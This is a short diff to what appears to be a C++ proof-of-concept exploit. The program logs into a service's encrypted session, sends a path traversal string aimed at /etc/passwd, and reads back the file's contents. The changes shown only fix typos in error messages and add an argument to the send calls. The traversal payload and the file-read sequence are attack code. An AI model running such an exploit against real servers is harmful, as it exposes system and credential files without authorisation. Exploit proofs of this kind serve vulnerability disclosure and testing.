@@ -125,7 +125,7 @@ int main(int p_argc, const char** p_argv)
 
     if (!jsSession.negotiateEncryption(username, password))
     {
-        std::cerr << "Encryption neogitiation failed." << std::endl;
+        std::cerr << "Encryption negotiation failed." << std::endl;
         return EXIT_FAILURE;
     }
 
@@ -135,7 +135,7 @@ int main(int p_argc, const char** p_argv)
     msg.set_request_id(1);
     msg.set_reply_expected(true);
     msg.add_string(1, "//./.././.././../etc/passwd");
-    jsSession.sendEncrypted(msg);
+    jsSession.sendEncrypted(msg, false);
     msg.reset();
 
     if (!jsSession.recvEncrypted(msg))
@@ -164,12 +164,12 @@ int main(int p_argc, const char** p_argv)
     msg.set_request_id(2);
     msg.set_session_id(sessionID);
     msg.add_u32(2, file_size);
-    jsSession.sendEncrypted(msg);
+    jsSession.sendEncrypted(msg, false);
 
     msg.reset();
     if (!jsSession.recvEncrypted(msg))
     {
-        std::cerr << "Error in receiving file contents." << std::endl;
+        std::cerr << "Error receiving file contents." << std::endl;
         return EXIT_FAILURE;
     }
 
